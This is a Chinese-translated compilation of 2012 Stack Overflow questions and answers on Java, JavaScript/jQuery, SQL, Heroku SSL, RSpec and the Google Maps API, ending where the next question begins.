> 时间：2012-05-30T07:08:51.390
> 
> 标签：java, bufferedimage, javax.imageio

我有一些非常简单的代码不起作用：

```
int[] manualPixels = new int[width * height * 3];
for (int index = 0; index < manualPixels.length; index++) {
    if (index % 3 == 2) {
        manualPixels[index] = 255;
    }
}
BufferedImage pixelImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);    
pixelImage.setRGB(0, 0, width, height, manualPixels, 0, width);

ImageIO.write(pixelImage, "jpeg", tempFile); 
```

据我所知，这应该输出红色、绿色或蓝色图像，具体取决于循环中的`if`语句中使用的是 0、1 还是 2。`for`问题是，无论我设置哪个像素，我总是得到蓝色和黑色条纹。例如：

![在此处输入图像描述](../Images/3e625d1145c904285f1101678a9f6c67.png)

我确定我在这里做错了一些基本的事情，我只是没有看到它是什么。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:15:06.630

`INT_RGB`将所有通道打包到`int`. 这意味着您将每三个像素设置为蓝色，其余像素保持黑色。（但这与您的图像不匹配 - 您在生成代码后是否更改了代码？）

试试这个：

```
int[] manualPixels = new int[width * height];
for (int index = 0; index < manualPixels.length; index++) {
    switch (index % 3) {
        case 0: manualPixels[index] = 0xFF0000; break; // red
        case 1: manualPixels[index] = 0x00FF00; break; // green
        case 2: manualPixels[index] = 0x0000FF; break; // blue
    }
} 
```

# java - 如何在java中的单个集合中使用不同类型的数据

> ID：10811550
> 
> 赞同：1
> 
> 时间：2012-05-30T07:09:37.723
> 
> 标签：java, android

我想使用集合制作这种类型的数据格式。

```
[username] = test
[password] = test
[model] = City
[action] = add
[City] = Array
    (
        [name] = Added from me
        [state_id] = 1243
    ) 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-30T07:11:38.523

`Map`很适合这里

```
Map<Object, Object> map = new HashMap<Object, Object>();
map.put("username", "test@test.com");
map.put("city", arrayOfCity); 
```

确保如果您正在使用实现，`HashMap`那么您需要为您添加的自定义类型提供合理的版本`hashcode()``equals()``Map`

*如果您有一组固定的属性，那么您应该使用类并创建一个，如果没有，则使用 map*

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-30T07:16:26.073

我会将您的对象收集到一个对象中：

```
public class Person {

     private final String username;
     private final String[] cities;

     public Person(String username, String[] cities){
          this.username = username;
          this.cities = cities;
     }

     public String getUsername(){
          return this.username;
     }

     public String[] getCities(){  // or pass an int and return one city
          return this.cities; 
     }
} 
```

然后，您可以将它放在一个集合中：

```
Person p1 = new Person("test@test.com", new String[]{"Liverpool","London"});
Person p2 = new Person("another@test.com", new String[]{"New York","California"});

List<Person> people = new ArrayList<Person>();
people.add(p1);
people.add(p2); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T07:11:55.540

你可以使用Java HashMap。这将为您提供您所需要的。

```
Map<String, Object> map = new HashMap<String, Object>(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:16:59.233

您可以编写一个**pojo**映射到您提到的字段。这将比使用集合来存储单个实体**更清楚。**

# javascript - 修改地板/天花板功能以使用 1 以外的数字？

> ID：10811551
> 
> 赞同：3
> 
> 时间：2012-05-30T07:09:40.250
> 
> 标签：javascript

默认情况下， floor 函数总是向下舍入， ceil 函数总是向上舍入到最接近的 '1'

我将如何向下/向上舍入到最接近的 20 或最接近的 1,000？

假设我有一个数字 x 和一个因子 y。

我想找到最接近 x 的 y 因子。

我正在使用它来查找图表的最大值和最小值。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-30T07:11:58.770

简单的：

```
var z = y * Math.floor(x / y); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:11:58.263

```
Math.floor(x / 20) * 20;
Math.ceil(x / 20) * 20; 
```

在你的情况下：

```
Math.floor(x / y) * y; 
```

将`x / y`表达式转换为`units of y`; 用`.floor()`or`.ceil()`然后将其向下或向上舍入；之后你`y`再乘以得到你的最终答案。

# facebook - 使用 Facebook API 标记相册

> ID：10811552
> 
> 赞同：0
> 
> 时间：2012-05-30T07:09:45.377
> 
> 标签：facebook, facebook-graph-api

是否可以使用 Facebook 的图形 API 来标记相册中的人？注意：我不想标记单个照片，而是整个相册。

我已经对[facebook Graph API explorer](https://developers.facebook.com/tools/explorer)进行了试验，发现当您将照片的 id 替换为相册时，在照片中标记 facebook 用户的 POST 请求不起作用。它回来了

```
{
  "error": {
  "message": "Unsupported post request.", 
  "type": "GraphMethodException", 
  "code": 100
} 
```

}

**请注意**：我的问题不是[这个问题](https://stackoverflow.com/questions/3017861/how-can-i-tag-a-user-in-a-photo-using-the-facebook-graph-api)的重复，因为我的问题是关于标记**相册**而不是照片。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-30T07:26:26.980

不，无法在相册中标记用户。
据我所知，您不能作为普通用户在 facebook 中执行此操作，那么为什么可以通过 api 实现呢？
当您看到在相册中标记的用户时，它只是 facebook 聚合照片标签。

此外，如果您查看[Photo 对象文档](http://developers.facebook.com/docs/reference/api/photo)，您会发现它具有[Tags 连接](http://developers.facebook.com/docs/reference/api/photo/#tags)，另一方面，[Album 对象](http://developers.facebook.com/docs/reference/api/album/)没有类似的连接。

# jquery - 如果不存在，如何动态加载 jquery 库？

> ID：10811555
> 
> 赞同：0
> 
> 时间：2012-05-30T07:10:00.127
> 
> 标签：jquery, load, cycle

我知道，感谢本[教程](http://alexmarandon.com/articles/web_widget_jquery/)`<script src="/widget/widget.js?type=normal" type="text/javascript"></script>`，如果主机网站没有它，如何动态加载 jQuery（例如调用）：

```
(function () {
    var jQuery;

    if (window.jQuery === undefined || window.jQuery.fn.jquery !== '1.4.2') {
        var script_tag = document.createElement('script');
        script_tag.setAttribute("type", "text/javascript");
        script_tag.setAttribute("src", pathWidget + "/scripts/jquery-1.7.min.js");

        if (script_tag.readyState) {
            script_tag.onreadystatechange = function () { // For old versions of IE
                if (this.readyState == 'complete' || this.readyState == 'loaded') {
                    scriptLoadHandler();
                }
            };
        } else {
            script_tag.onload = scriptLoadHandler;
        }
        (document.getElementsByTagName("head")[0] || document.documentElement).appendChild(script_tag);
    } else {
        jQuery = window.jQuery;
        main();
    }

    function scriptLoadHandler() {
        jQuery = window.jQuery.noConflict(true);
        main();
    }

    function main() {
        jQuery(document).ready(function ($) {

        });
    }
})(); 
```

好吧，现在我想为 jquery 库做同样的事情。让我们说 jQuery Cycle。

我试过了：

```
var script_cycle = document.createElement('script');
script_cycle.setAttribute("type", "text/javascript");
script_cycle.setAttribute("src", pathWidget + "/scripts/jquery.cycle.all.js"); 
```

后 ：

```
script_tag.setAttribute("src", pathWidget + "/scripts/jquery-1.7.min.js"); 
```

但是当我将循环加载到准备好的文档中时，我收到了这个错误：

```
$("#myRotator").cycle is not a function 
```

我哪里错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:13:50.047

尝试检查插件是否已加载：

```
if(!jQuery().cycle) {
  var script_cycle = document.createElement('script');
  script_cycle.setAttribute("type", "text/javascript");
  script_cycle.setAttribute("src", pathWidget + "/scripts/jquery.cycle.all.js");
  (document.getElementsByTagName("head")[0] || document.documentElement).appendChild(script_cycle);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:19:38.593

您可以使用**[$.getScript()](http://api.jquery.com/jQuery.getScript/)**加载外部 Javascript 文件。

```
if(!jQuery().cycle) {
    $.getScript('/scripts/jquery-1.7.min.js', 
    function() {});
} 
```

# javascript - 单击以关闭移动设备上的 jQuery 下拉菜单，同时保留其他行为

> ID：10811556
> 
> 赞同：0
> 
> 时间：2012-05-30T07:10:07.453
> 
> 标签：javascript, jquery

我有一个非常简单的 jQuery 下拉菜单，其中包含通常的 ul/li 列表排列中的链接。下拉菜单的代码如下：

```
$('body').ready(function() {
      if(screen.width <= 720) {
          $('.dropdown').hover(function() { $(this).find('.subMenu').toggle(); });
          $('.dropdown').click(function() { if( $('this').css('display') != 'none') {
              $('this').toggle();
              }
          });
      }
      else
      {
          $('.dropdown').hover(
              function() { $(this).stop(true,true).find('.subMenu').slideDown("fast"); },
              function() { $(this).stop(true,true).find('.subMenu').hide(); } 
          );
      }
  }); 
```

在移动设备上（忽略 720 宽度，现在只是为了测试），我想实现以下功能：

*   用户点击带有下拉菜单的链接 > 如果菜单已打开，请关闭它

*   用户在另一个菜单已打开时点击链接 > 关闭上一个菜单，打开当前菜单

*   用户点击页面上的其他位置 > 关闭所有打开的菜单

我发现悬停功能实际上处理了#2 和#3，但我不知道如何让#1 工作。我很确定我知道为什么要进行这种特殊的尝试

```
$('.dropdown').click(function() { if( $('this').css('display') != 'none') {
      $('this').toggle();
      }
}); 
```

失败。我猜点击（或点击，在这种情况下）触发悬停事件，这似乎优先，因此显示菜单，而不是隐藏它。

我怎样才能让它在移动设备上工作？

编辑：我正在使用 jQuery v1.7.2

HTML列表结构如下，以防对某人有帮助（精简版）：

```
 <div id="navbar">
      <ul>
        <li class="dropdown"><a href="#">Link A</a></li>
        <li class="dropdown"><a href="#">Link B</a>
          <ul class="subMenu">
            <li><a href="#">Link 1</a></li>
            <li><a href="#">Link 2</a></li>
          </ul>
        </li>
      </ul>
    </div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:30:48.127

if( $('this').css('display') != 'none') 可以替换为 if($('this').is(':hidden'))

您可以使用 .siblings() 关闭其他菜单...看不到 html 代码来说明选择器的外观。

作为选项，您可以添加一些类来检查是否还有其他打开的菜单...

```
 $('.dropdown').hover(function() { 
      $('.openedMenu .subMenu').hide().removeClass('openedMenu');
      $(this).find('.subMenu').toggle(); 
      $(this).addClass('openedMenu');
  });
  $('.dropdown').click(function() { 
      if( $('this').is(':hidden')) {
          $('this').toggle();
      }
  }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:45:10.353

我只在 1 个移动网络项目中工作过，但我也遇到了点击事件的问题。我正在使用 jQuery 移动框架。解决方法是使用 jQm 中包含的“tap”事件，而不是单击。我猜你没有使用 jQuery mobile，我发现这个插件可以帮助你创建“点击”事件：[http ://aanandprasad.com/articles/jquery-tappable/](http://aanandprasad.com/articles/jquery-tappable/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T08:11:54.860

如果您使用 jq 1.7+，请在此处尝试此演示[http://jsfiddle.net/SCN5T/3/](http://jsfiddle.net/SCN5T/3/)

```
$(function(){
    $(document).mousedown(function(){
         $('.dropdown .active').removeClass('active').children('ul').hide();
    })
    $('.dropdown').on('mousedown','.subMenu', function(e){
        e.stopPropagation();
        var elem = $(this);
        if(elem.is('.active')) {
            elem.children('ul').slideUp(150);
            elem.removeClass('active');
        } else {
             $('.dropdown .active').removeClass('active').children('ul').hide();
            elem.addClass('active').children('ul').slideDown(150);
        }
    });
    $('.subMenu').on('mousedown','ul', function(e){
        e.stopPropagation();
        alert('menu item clicked');
    });       
}) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T08:43:49.463

以下代码解决了我的特定问题：

```
$('html').mousedown(function() {
    $('.subMenu').hide();
    });

$('#navbar').mousedown(function(event) {
    event.stopPropagation();
    });

$('.dropdown').mousedown(function() {
    var ele = $(this).find('.subMenu');
    $('#navbar').find('.subMenu').each(function(index) { if(!$(this).is(ele)) $(this).hide(); } );
    ele.toggle();
    }); 
```

我遵循的基本思想是在接收到 mousedown 事件时找到子菜单并隐藏它们，除非该元素是用户单击的菜单。然后切换显示或隐藏菜单。事件传播部分和 body/html 隐藏部分来自 acrashik 的答案，更改`$('html')`为来自此[答案](https://stackoverflow.com/a/2868645/263356)。

# java - 为什么java线程不启动？

> ID：10811557
> 
> 赞同：-1
> 
> 时间：2012-05-30T07:10:15.770
> 
> 标签：java, multithreading, java-native-interface

```
package keylogger;

public class TestKeys {
private static int i = 0;
private native void setWinHook();
private native void unregisterWinHook();

public static void main(String args[]) {

    TestKeys o = new TestKeys();

    System.loadLibrary("MyHook"); // load the library that registers the hook

    Runnable r = new Runnable() {
        @Override
        public void run() {
            System.out.println("After the call to System.loadLibrary");
        }
    };
    new Thread(r,"new thread").start();  
  }
} 
```

当我启动程序时，`dll`它被加载并且它的工作。`run method`但是of中的语句`new thread`不会被打印出来。这是为什么 ？*为什么java线程不启动？*dll 代码不会立即返回。事实上，它没有办法返回。

和 ：

*程序遇到语句时是否启动新线程`System.loadLibrary`*？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:11:45.553

> 当程序遇到语句 System.loadLibrary 时是否启动新线程？

除非库在其初始化部分创建一个。

PS如果你[`join()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Thread.html#join%28%29)是线程，行为会改变吗？

# sql-server - SQL Server 2008 R2 中的并行处理

> ID：10811560
> 
> 赞同：0
> 
> 时间：2012-05-30T07:10:26.343
> 
> 标签：sql-server, sql-server-2008-r2

我想像一台服务器一样运行我的 2（两个）SQL Server 2008 R2 企业版。如果一台服务器太忙，系统应将请求定向到另一台服务器。我怎样才能做到这一点？谢谢..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T14:22:10.797

查看 SQL Server 服务代理。这是 SQL Server 中的异步消息传递系统。有一种方法可以使用在多个进程中运行的存储过程从队列中读取

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T09:40:48.773

没有你想要的东西，SQL Server 不支持“负载平衡”。Active/Active 集群是指两个*不同*的集群在相同的主机上处于活动状态。

您可以使用[AlwaysOn](http://rusanu.com/2010/11/11/alwayson-high-availability-and-reads-scale-out/)等技术横向扩展*读取，您可以使用*[应用层中的分片数据](http://rusanu.com/2011/06/01/scale-out-sql-server-by-using-reliable-messaging/)、[SQL Azure 联合](http://msdn.microsoft.com/en-us/library/windowsazure/hh597452.aspx)、[合并复制](http://msdn.microsoft.com/en-us/library/ms152746%28v=sql.105%29)或[带有事务复制的可更新订阅](http://msdn.microsoft.com/en-us/library/ms151718.aspx)（现已弃用）以*异步*方式横向扩展写入（具有最终一致性）

# ruby-on-rails - 如何配置裸域名以使用 Heroku 的 SSL 端点？

> ID：10811562
> 
> 赞同：4
> 
> 时间：2012-05-30T07:10:58.330
> 
> 标签：ruby-on-rails, ruby, ssl, heroku, dns

我最近在 Heroku 上运行的 Rails 应用程序中添加了 SSL 功能。我成功地为我的域购买并创建了证书，并在 GoDaddy 中使用 CNAME，当用户浏览 www.myappname.com 时，我的应用程序的 WWW 子域正常工作

页面加载时没有任何警告，并且证书按预期工作。

CNAME 看起来像这样： **主机：** www **指向：** myappnamefoobar-1234.herokussl.com

但是，当我只是转到“裸”域名 - myappname.com 时，会出现证书错误。

如何在 GoDaddy 中配置 DNS 设置以使其正常工作？

[https://devcenter.heroku.com/articles/avoiding-naked-domains-dns-arecords](https://devcenter.heroku.com/articles/avoiding-naked-domains-dns-arecords)

Heroku 的文档中有一篇关于裸域的整篇文章，但我不明白这将如何适用于 GoDaddy 的 DNS 管理器。

我知道 Heroku 有某种付费的基于 IP 的 SSL，但还有其他方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T08:33:53.693

诀窍是使用机架重写：

[https://github.com/jtrupiano/rack-rewrite](https://github.com/jtrupiano/rack-rewrite)

它允许 Rails 从 mydomainname.com 重定向到 www.mydomainname.com，因为 Heroku 不允许裸域。

然后，您使用 DNS 管理器将 www.mydomain.com 指向 Heroku 的 SSL 端点（付费，每月 20 美元）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-22T02:52:01.443

我不相信 GoDaddy 支持这样的功能。

最好的选择是使用类似 DNSimple 的[ALIAS 记录类型](http://blog.dnsimple.com/zone-apex-naked-domain-alias-that-works/)，它为 CNAME 记录提供根域支持。

然后，您可以像这样设置您的记录（假设使用[SSL 端点](https://devcenter.heroku.com/articles/ssl-endpoint)进行 SSL）。

```
| type  | name | target                  |
| ALIAS |      | tokyo-123.herokussl.com |
| CNAME | www  | tokyo-123.herokussl.com | 
```

尽管有其他 DNS 提供商提供类似的 ALIAS 记录功能，但它不在 DNS 规范中。这就是为什么我们尚未提供有关使用此类记录的详尽文档的原因。但是，鉴于缺乏对那些想要根域支持的人的明确指导，我们的目标是在不久的将来纠正这个问题。

还要留意[使用 AWS Route 53 作为 Heroku 应用程序的 DNS](https://devcenter.heroku.com/articles/route-53)。我相信很快就能在 R53 上实现这一目标。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-31T12:57:44.037

如果您购买的证书具有通用名称`"www.yourdomain.com"`并且您使用任何其他 URL 浏览到该站点，您将在浏览器中收到证书警告。

警告告诉您 URL 与域名不匹配。

解决此问题的一种方法是购买通配符证书。这允许`*.yourdomain.com"`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-06-14T14:39:32.603

我一直在为同样的问题苦苦挣扎。我总是不得不自己设置一个 301 SSL 重定向，所以在某个时候我累了，决定创建[https://www.nakedssl.com](https://www.nakedssl.com)来解决这个问题。一个域是免费的:)。

免责声明：显然，我是创建 NakedSSL 团队的一员，有些人可能会考虑这种自我推销——即使我们免费提供服务。无论如何，我认为在所有 DNS 管理提供商都支持裸域上的 CNAME/ALIAS 之前，这仍然是一个很好的解决方法。

# junit - 使用抽象类进行 Junit + WebDriver 自动化测试

> ID：10811564
> 
> 赞同：3
> 
> 时间：2012-05-30T07:10:59.190
> 
> 标签：junit, automated-tests, webdriver, abstract-class

我有一个关于自动化测试的问题。

我需要测试搜索不同的语言（法语、德语等）

所有的测试方法都是一样的，所以我不想重复代码。只是搜索查询不同

实施它的最佳实践是什么。

如果您有经验如何做到这一点，如果您给我一些小例子，将会非常有帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T12:11:31.990

1.  使用 Id、类、属性的规范元素命名将布局与内容语言分开。
2.  如果您无法控制目标网站，请使用属性文件
    *   英语.元素名称.xpath=
    *   french.element-name.xpath=
    *   German.element-name.xpath=
3.  使用内置的 Java 本地化支持，例如
    *   ResourceBundle.getBundle("GuiMapBundle", targetLocale);
4.  使用多态，例如
    *   英文网站扩展了 SiteNavigation
    *   FrenchSite 扩展了 SiteNavigation
    *   GermanSite 扩展了 SiteNavigation

# iphone - 如何在 UIwebView 中播放视频文件？

> ID：10811567
> 
> 赞同：0
> 
> 时间：2012-05-30T07:11:06.477
> 
> 标签：iphone, objective-c, ios, video, uiwebview

我知道如何在 WebView 中加载文档。`[webView loadRequest:urlRequest];`

但如果我使用相同的代码打开视频文件，webView 的工作很奇怪。WebView 开始播放视频，顶部有 PLAY 按钮。如何删除它？有没有其他方法可以流畅地在 webview 中播放视频？

# ruby-on-rails - 作为一个人，我可以查看 RSpec 渲染的视图吗？如果，那么如何？

> ID：10811568
> 
> 赞同：11
> 
> 时间：2012-05-30T07:11:06.537
> 
> 标签：ruby-on-rails, rspec

我希望能够看到我的视图规范之一中请求的路径的输出。Rspec 可以访问渲染视图，但我想自己访问它。有谁知道如何实际查看渲染视图？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-30T07:27:22.537

您可以将[capybara](https://github.com/jnicklas/capybara)与[launchy](http://rubygems.org/gems/launchy)一起使用，然后您可以使用 capybara 的 save_and_open_page 方法。[在此博客文章](http://techiferous.com/2010/04/using-capybara-in-rails-3/)中阅读更多详细信息。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-04T21:19:08.857

你想看到它在浏览器中呈现还是只是 HTML 很好？您应该能够在一个名为 的实例变量中访问 HTML `@rendered`。

```
puts @rendered
# <html>...</html> 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-03-30T19:46:30.573

如果像我一样，你不想使用 capybara + launchy，或者你不能让它工作，你可以这样做：

```
 IO.write('/tmp/test.html', rendered) 
```

...如果你在 Mac 上：

```
 `open /tmp/test.html` 
```

# javascript - Google Maps API - FusionTables 图层示例 - 地图未显示

> ID：10811571
> 
> 赞同：0
> 
> 时间：2012-05-30T07:11:32.957
> 
> 标签：javascript, google-maps-api-3

我正在使用我的数据尝试 Google Maps API 高级可视化示例。但是，地图和图表都没有显示。Chrome 上的调试器将错误列为：“未捕获的类型错误：无法将属性“offsetWidth”读取为空。

我在 Stack 和旧的 google 群组中阅读了对特定错误的回复，但没有任何建议对我有用。

我希望有人可以查看代码并让我知道我缺少什么。我很确定它是非常小的东西，但我已经碰壁了，所以希望能有另一双眼睛关注它。

请注意，这是示例代码的确切版本 - 稍微调整了我的数据集以便能够检查它。

提前致谢。代码如下。

## -马达维

```
 <script type="text/javascript" src="http://www.google.com/jsapi"></script> <script type="text/javascript"> google.load('visualization', '1', { packages: ['corechart'] });

      /** * Sector type mapped to a style rule. * @type {Object} * @const */ var LAYER_STYLES = { 'Operational': { 'min': 0, 'max': 10000, 'colors': [ '#f4cccc', '#ea9999', '#e06666', '#cc0000',
       '#990000' ] }, 'Formally Approved': { 'min': 0, 'max': 10000, 'colors': [ '#d0e0e3', '#a2c4c9', '#76a5af', '#45818e', '#134f5c' ] }, 'In-Principle Approved': { 'min': 0, 'max': 20000, 'colors': [
       '#d9d2e9', '#b4a7d6', '#8e7cc3', '#674ea7', '#351c75' ] } }

function initialize() {

  var sector = 'Operational';

  var india = new google.maps.LatLng(21.7679,78.8718); var options = {}; options['dataMode'] = 'markers';

  map = new google.maps.Map(document.getElementById('map_canvas'), { center: india, zoom: 5, mapTypeId: google.maps.MapTypeId.ROADMAP, zoomControlOptions: { style: google.maps.ZoomControlStyle.SMALL },
    });

  var layer = new google.maps.FusionTablesLayer(); updateLayerQuery(layer, sector); layer.setMap(map);

  createLegend(map,sector); styleLayerBySector(layer,sector); styleMap(map); drawVisualization('Andhra Pradesh');

  google.maps.event.addListener(layer,'click',function(e) { var state = e.row['State'].value; drawVisualization(state);

  var area = e.row['Area in Acres'].value; if (area > 5000) { e.infoWindowHtml = '<p class="high">High SEZ area!</p>'; } else if (area > 2500) { e.infoWindowHtml = '<p class="high">Medium SEZ area!</p>
  '; } else { e.infoWindowHtml = '<p class="high">Low SEZ area!</p>'; }

 });

 google.maps.event.addDomListener(document.getElementById('sector'), 'change',function() { sector = this.value; updateLayerQuery(layer,sector); styleLayerBySector(layer,sector); updateLegend(sector);
    });

  google.maps.event.addDomListener(document.getElementById('state'), 'change',function() { var state = this.value; updateLayerQuery(layer,sector,state); drawVisualization(state); }); };

function updateLayerQuery(layer,sector,state) { var where = "SEZ Type= '"+ sector + "'"; if (state) { where += "AND State = '" + state + "'"; } layer.setOptions({ query: { select : 'geometry', from:
    '4070871', where: where } }); }

function createLegend(map, sector) { var legendWrapper = document.createElement('div'); legendWrapper.id = 'legendWrapper'; legendWrapper.index = 1;
        map.controls[google.maps.ControlPosition.LEFT_BOTTOM].push( legendWrapper); legendContent(legendWrapper, sector); }

function legendContent(legendWrapper, sector) { var legend = document.createElement('div'); legend.id = 'legend';

        var title = document.createElement('p'); title.innerHTML = sector + ' SEZs by State in India'; legend.appendChild(title);

        var layerStyle = LAYER_STYLES[sector]; var colors = layerStyle.colors; var minNum = layerStyle.min; var maxNum = layerStyle.max; var step = (maxNum - minNum) / colors.length; for (var i = 0; i <
        colors.length; i++) { var legendItem = document.createElement('div');

          var color = document.createElement('div'); color.setAttribute('class', 'color'); color.style.backgroundColor = colors[i]; legendItem.appendChild(color);

          var newMin = minNum + step * i; var newMax = newMin + step; var minMax = document.createElement('span'); minMax.innerHTML = newMin + ' - ' + newMax; legendItem.appendChild(minMax);

          legend.appendChild(legendItem); }

        legendWrapper.appendChild(legend); }

   function updateLegend(sector) { var legendWrapper = document.getElementById('legendWrapper'); var legend = document.getElementById('legend'); legendWrapper.removeChild(legend); legendContent(
          legendWrapper, sector); }

    function styleLayerBySector(layer, sector) { var layerStyle = LAYER_STYLES[sector]; var colors = layerStyle.colors; var minNum = layerStyle.min; var maxNum = layerStyle.max; var step = (maxNum -
            minNum) / colors.length;

            var styles = new Array(); for (var i = 0; i < colors.length; i++) { var newMin = minNum + step * i; styles.push({ where: generateWhere(newMin, sector), polygonOptions: { fillColor:
            colors[i], fillOpacity: 1 } }); } layer.set('styles', styles); }

function generateWhere(minNum, sector) { var whereClause = new Array(); whereClause.push("Sector = '"); whereClause.push(sector); whereClause.push("' AND 'Area in Acres' >= "); whereClause.push(minNum);
        return whereClause.join(''); }

 function styleMap(map) { var style = [{ featureType: 'all', stylers: [{ saturation: -99 }] }, { featureType: 'poi', stylers: [{ visibility: 'off' }] }, { featureType: 'road', stylers: [{ visibility:
        'off' }] }];

        var styledMapType = new google.maps.StyledMapType(style, { map: map, name: 'Styled Map' }); map.mapTypes.set('map-style', styledMapType); map.setMapTypeId('map-style'); }

function drawVisualization(state) { google.visualization.drawChart({ containerId: "visualization", dataSourceUrl: "http://www.google.com/fusiontables/gvizdata?tq=", query: "SELECT 'SEZ Type' as Sector,
        'Area in Acres' as Area " + "FROM 4070871 WHERE State = '" + state + "'", chartType: "ColumnChart", options: { title: state, height: 400, width: 400 } }); }

google.maps.event.addDomListener(window, 'load', initialize()); </script> </head> <body >

     <div id="map-canvas" style="width: 500px;height: 500px">Loading..</div> <div id="visualization"></div> <form> <label>SEZ Type </label> <select id="sector"> <option value="Operational">Operational
     </option> <option value="Formally Approved">Formally Approved</option> <option value="In-Principle Approved">In-Principle Approved</option> </select>

 <label>State</label> <select id="state"> <option value="Andhra Pradesh">Andhra Pradesh</option> <option value="Chandigarh">Chandigarh</option> <option value="Chattisgarh">Chattisgarh</option> <option
  value="Dadra and Nagar Haveli">Dadra and Nagar Haveli</option> <option value="Delhi">Delhi</option>

  </select> </form> </body> </html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:44:07.250

确保指定包含地图的 div 的大小。

进一步确保您的地图变量是在全局范围内定义的，并确保您在加载 dom 时初始化地图，即在身体加载时

# javascript - 在 Javascript 或 Jquery 中的 iframe 中的外部站点的 URL 时出现错误

> ID：10811574
> 
> 赞同：2
> 
> 时间：2012-05-30T07:11:39.220
> 
> 标签：javascript, jquery

```
alert(document.getElementById('external-site').contentWindow.location.href); 
```

大家好，此代码在**Chrome**中运行并显示“未定义”，但在**Mozilla Firefox**中显示错误。

**错误：访问属性“href”的权限被拒绝**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:16:42.980

如果`document.getElementById('external-site')`指的是从不同域加载页面的 iframe，则 firefox 会遇到`same-origin policy`错误并且您无法访问`window.location`对象

来自[MDN](https://developer.mozilla.org/En/Same_origin_policy_for_JavaScript)：

> 同源策略防止从一个源加载的文档或脚本从另一个源**获取**或设置文档的属性。该政策可以追溯到 Netscape Navigator 2.0。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T13:52:47.423

既然你想要做的就是“检查”它是否是外部的，为什么不捕捉错误呢？似乎在 FF 和 Chrome 中工作。请参阅[jsFiddle](http://jsfiddle.net/AyrRe/)。

```
try {
    alert(document.getElementById('external-site').contentWindow.location.href);
}
catch (err) {
    alert("undefined");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-10-25T13:01:30.900

我也遇到了同样的错误。

为了克服这个错误，我使用了以下代码行：

`alert(document.getElementById('external-site').contentWindow.document.location.href);`

# sql - 无法绑定多部分标识符

> ID：10811576
> 
> 赞同：7
> 
> 时间：2012-05-30T07:11:53.403
> 
> 标签：sql

> **可能重复：**
> [无法绑定多部分标识符](https://stackoverflow.com/questions/2531924/the-multi-part-identifier-could-not-be-bound)

这是我不想工作的查询。

它说：无法绑定多部分标识符“dbo.RunSequenceBatch.RunSequenceBatchName”。

您能否提一些建议？

提前致谢！！！:)

```
SELECT '30 May' AS [Date],
[RunSeq].[RunSequenceBatchName] AS [Batch Job Name] ,
RunSeqCat.CategoryDescription AS [Development Name] ,
[Systems].SystemName AS [System Area] ,
CAST((SUM(DumpSM37_Env3.Duration) / 60) AS NUMERIC(10, 2)) AS [Duration (mins)] 
FROM [dbo].[RunSequenceBatch] AS RunSeq 
LEFT JOIN DumpSM37_Env3 ON ([RunSeq].[RunSequenceBatchName] =  DumpSM37_Env3.[Job] 
AND DumpSM37_Env3.[ImportDate] BETWEEN  '30 May 2012 00:00:00' AND '30 May 2012 23:59:59'), 
[dbo].[RunSequenceType] AS RunSeqType, 
[dbo].[RunSequenceFrequency] AS RunSeqFrequency, 
RunSequenceCategory AS RunSeqCat, Category, [Systems]  
WHERE RunSeq.Status = 'Active' 
AND RunSeqFrequency.RunSequenceBatchID  = RunSeq.RunSequenceBatchID 
AND RunSeq.RunSequenceTypeID = RunSeqType.RunSequenceTypeID 
AND RunSeqCat.CategoryDescription = Category.Description 
AND Category.SystemArea = [Systems].SystemID 
AND DumpSM37_Env3.[Duration] > 0 
AND RunSeq.RunSequenceTypeID = 1 
AND RunSeqCat.RunSequenceBatchID = RunSeq.RunSequenceBatchID  
GROUP BY dbo.RunSequenceBatch.RunSequenceBatchName, DumpSM37_Env3.WorkerProcessID, 
ORDER BY [RunSeqFrequency].[Frequency] ASC, 
[RunSeqFrequency].[StartTime] ASC 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-30T07:31:33.143

基本上，您的表名不匹配。

在你的`FROM`你有：

```
FROM [dbo].[RunSequenceBatch] AS RunSeq 
```

你在别名`[dbo].[RunSequenceBatch]`换句话说，你说从现在开始，`[dbo].[RunSequenceBatch]`将被称为`RunSeq`

但是在您的情况下，`GROUP BY`您不会使用别名来引用它。因为查询中唯一公开的名称中的别名，`dbo.RunSequenceBatch`无法绑定。

改变

```
GROUP BY dbo.RunSequenceBatch.RunSequenceBatchName 
```

到

```
GROUP BY RunSeq.RunSequenceBatchName 
```

你会没事的。

# c# - 清洁 XML 序列化分层递归数据结构

> ID：10811580
> 
> 赞同：3
> 
